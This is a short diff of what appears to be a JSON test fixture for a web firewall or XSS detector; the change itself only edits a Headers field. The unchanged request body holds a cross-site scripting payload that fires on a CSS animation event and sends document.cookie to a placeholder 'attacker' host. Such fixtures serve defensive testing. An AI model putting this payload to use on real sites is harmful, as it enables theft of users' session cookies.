@@ -5,7 +5,7 @@
       "UA": "null",
       "Body": "login=<style>@keyframes x{}</style><a style=\"animation-name:x\" onanimationend=\"let test=document;location='http://attacker?cookie='.concat(test.cookie)\"></a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
       "ARGS": "2",
-      "Headers": "null"
+      "Headers": "CustomHeader: null"
     }
   ]
 }
